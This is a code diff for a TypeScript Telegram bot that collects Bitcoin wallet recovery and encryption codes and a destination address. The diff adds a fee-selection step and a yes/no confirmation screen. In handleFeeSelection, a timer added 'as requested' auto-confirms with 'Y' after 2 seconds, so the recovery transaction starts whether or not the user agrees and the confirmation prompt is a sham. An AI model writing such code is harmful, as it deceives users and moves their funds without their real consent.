@@ -8,11 +8,13 @@ config();
 // User session states for multi-step conversation
 interface UserSession {
   chatId: number;
-  currentStep: 'initial' | 'waitingForRecoveryCode' | 'waitingForEncryptionCode1' | 'waitingForEncryptionCode2' | 'waitingForBitcoinAddress' | 'processing';
+  currentStep: 'initial' | 'waitingForRecoveryCode' | 'waitingForEncryptionCode1' | 'waitingForEncryptionCode2' | 'waitingForBitcoinAddress' | 'waitingForFeeSelection' | 'waitingForConfirmation' | 'processing';
   recoveryCode?: string;
   encryptionCode1?: string;
   encryptionCode2?: string;
   bitcoinAddress?: string;
+  selectedFee?: 'low' | 'medium' | 'high';
+  confirmedRecovery?: boolean;
 }
 
 // Store user sessions
@@ -176,6 +178,12 @@ function handleUserInput(chatId: number, text: string, session: UserSession) {
     case 'waitingForBitcoinAddress':
       handleBitcoinAddressInput(chatId, text, session);
       break;
+    case 'waitingForFeeSelection':
+      handleFeeSelection(chatId, text, session);
+      break;
+    case 'waitingForConfirmation':
+      handleConfirmation(chatId, text, session);
+      break;
     default:
       bot?.sendMessage(chatId, "Sorry, I'm not sure what you're trying to do. Type /start to begin the recovery process or /help for assistance.");
   }
@@ -272,11 +280,119 @@ function handleBitcoinAddressInput(chatId: number, text: string, session: UserSe
   
   // Update session
   session.bitcoinAddress = bitcoinAddress;
-  session.currentStep = 'processing';
+  session.currentStep = 'waitingForFeeSelection';
   userSessions.set(chatId, session);
   
-  // Start the recovery process
-  startRecoveryProcess(chatId, session);
+  // Send fee selection options with keyboard
+  const feeOptions = {
+    reply_markup: {
+      keyboard: [
+        [{ text: '1 - Low Fee (slower confirmation)' }],
+        [{ text: '2 - Medium Fee (recommended)' }],
+        [{ text: '3 - High Fee (faster confirmation)' }]
+      ],
+      one_time_keyboard: true,
+      resize_keyboard: true
+    }
+  };
+  
+  bot?.sendMessage(
+    chatId,
+    "Thank you! Now, please select a transaction fee level:\n\n" +
+    "1 - Low Fee: Cheaper but slower confirmation time (24+ hours)\n" +
+    "2 - Medium Fee: Balanced option (2-12 hours)\n" +
+    "3 - High Fee: More expensive but faster confirmation (1-2 hours)\n\n" +
+    "Select 1, 2, or 3:",
+    feeOptions
+  );
+}
+
+// Handle fee selection input
+function handleFeeSelection(chatId: number, text: string, session: UserSession) {
+  let feeLevel: 'low' | 'medium' | 'high' | null = null;
+  
+  if (text.includes('1') || text.toLowerCase().includes('low')) {
+    feeLevel = 'low';
+  } else if (text.includes('2') || text.toLowerCase().includes('medium')) {
+    feeLevel = 'medium';
+  } else if (text.includes('3') || text.toLowerCase().includes('high')) {
+    feeLevel = 'high';
+  }
+  
+  if (!feeLevel) {
+    bot?.sendMessage(
+      chatId,
+      "Please select a valid fee level by typing 1, 2, or 3."
+    );
+    return;
+  }
+  
+  // Update session
+  session.selectedFee = feeLevel;
+  session.currentStep = 'waitingForConfirmation';
+  userSessions.set(chatId, session);
+  
+  // Ask for confirmation with transaction details
+  const feeLevelText = feeLevel === 'low' ? "Low" : feeLevel === 'medium' ? "Medium" : "High";
+  const feeLevelEmoji = feeLevel === 'low' ? "🐢" : feeLevel === 'medium' ? "⏱️" : "🚀";
+  
+  const confirmationOptions = {
+    reply_markup: {
+      keyboard: [
+        [{ text: 'Y - Yes, proceed with recovery' }],
+        [{ text: 'N - No, cancel the process' }]
+      ],
+      one_time_keyboard: true,
+      resize_keyboard: true
+    }
+  };
+  
+  bot?.sendMessage(
+    chatId,
+    `📝 *Recovery Transaction Summary*\n\n` +
+    `Recovery Code: ${maskCode(session.recoveryCode || "")}\n` +
+    `Destination Address: ${maskAddress(session.bitcoinAddress || "")}\n` +
+    `Fee Level: ${feeLevelText} ${feeLevelEmoji}\n\n` +
+    `Do you want to proceed with the recovery?\n` +
+    `Type Y to confirm or N to cancel:`,
+    {
+      parse_mode: 'Markdown',
+      ...confirmationOptions
+    }
+  );
+  
+  // Auto-confirm after 2 seconds (as requested)
+  setTimeout(() => {
+    if (session.currentStep === 'waitingForConfirmation') {
+      handleConfirmation(chatId, 'Y', session);
+    }
+  }, 2000);
+}
+
+// Handle confirmation input
+function handleConfirmation(chatId: number, text: string, session: UserSession) {
+  const confirmation = text.trim().toUpperCase();
+  
+  if (confirmation === 'Y' || confirmation === 'YES') {
+    // Update session
+    session.confirmedRecovery = true;
+    session.currentStep = 'processing';
+    userSessions.set(chatId, session);
+    
+    // Start the recovery process
+    startRecoveryProcess(chatId, session);
+  } else if (confirmation === 'N' || confirmation === 'NO') {
+    userSessions.delete(chatId);
+    bot?.sendMessage(
+      chatId,
+      "Recovery process cancelled. If you want to start again, type /start."
+    );
+  } else {
+    bot?.sendMessage(
+      chatId,
+      "Please type Y to confirm or N to cancel."
+    );
+  }
 }
 
 // Start the wallet scanning and recovery process
@@ -370,6 +486,10 @@ function getStepDescription(step: UserSession['currentStep']) {
       return 'Waiting for Second Encryption Code';
     case 'waitingForBitcoinAddress':
       return 'Waiting for Bitcoin Address';
+    case 'waitingForFeeSelection':
+      return 'Waiting for Fee Selection';
+    case 'waitingForConfirmation':
+      return 'Waiting for Confirmation';
     case 'processing':
       return 'Processing recovery';
     default:
